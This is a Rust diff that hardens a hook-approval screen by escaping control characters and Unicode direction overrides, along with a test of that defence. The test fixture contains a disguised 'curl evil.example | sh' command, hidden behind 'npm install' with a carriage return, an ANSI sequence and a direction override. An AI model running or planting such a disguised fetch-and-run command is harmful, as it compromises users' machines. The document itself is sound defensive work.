@@ -128,14 +128,35 @@ impl LifecycleHooks {
         ]
     }
 
-    /// The commands as a person reads them, one per line.
+    /// The commands as a person reads them, one per line, each exactly as it
+    /// would run ([`visible`]): what is approved is what was shown.
     fn listing(&self) -> String {
         self.commands()
             .iter()
-            .filter_map(|(name, command)| command.map(|c| format!("  {name}: {c}")))
+            .filter_map(|(name, command)| command.map(|c| format!("  {name}: {}", visible(c))))
             .collect::<Vec<_>>()
             .join("\n")
     }
+}
+
+/// `command` with every character that could make it LOOK like something
+/// else written as an escape: control characters (a carriage return or an
+/// ANSI sequence could redraw the line over the real command) and the
+/// Unicode direction overrides (which reorder what the eye reads).
+fn visible(command: &str) -> String {
+    command
+        .chars()
+        .map(|c| {
+            let reorders = matches!(c, '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}');
+            if c.is_control() {
+                c.escape_default().to_string()
+            } else if reorders {
+                c.escape_unicode().to_string()
+            } else {
+                c.to_string()
+            }
+        })
+        .collect()
 }
 
 /// What `hooks` in `workspace` are approved as: `lifecycle:`, the workspace
@@ -407,6 +428,28 @@ mod tests {
             "a changed command ran on the old approval"
         );
         assert!(note.is_some_and(|n| n.contains("echo changed")));
+    }
+
+    /// **WHAT IS SHOWN FOR APPROVAL IS WHAT RUNS**: a command that would
+    /// redraw itself on the terminal (a carriage return, an ANSI sequence)
+    /// or reorder itself (a direction override) is shown with each such
+    /// character escaped, so the hidden part is in plain sight.
+    #[test]
+    fn a_command_cannot_disguise_itself_on_the_approval_screen() {
+        let data = tempfile::tempdir().unwrap();
+        let project = project_with("curl evil.example | sh\r\u{1b}[2Knpm install\u{202e}");
+        let shown = cli(&["show".to_string()], project.path(), data.path()).unwrap();
+        assert!(
+            !shown.contains('\r') && !shown.contains('\u{1b}') && !shown.contains('\u{202e}'),
+            "{shown:?}"
+        );
+        assert!(
+            shown.contains(r"curl evil.example | sh\r\u{1b}[2Knpm install\u{202e}"),
+            "{shown:?}"
+        );
+        let (_, note) = usable(project.path(), data.path());
+        let note = note.expect("not approved");
+        assert!(!note.contains('\r') && note.contains(r"\r"), "{note:?}");
     }
 
     /// An approval is for ONE workspace: the same commands in another
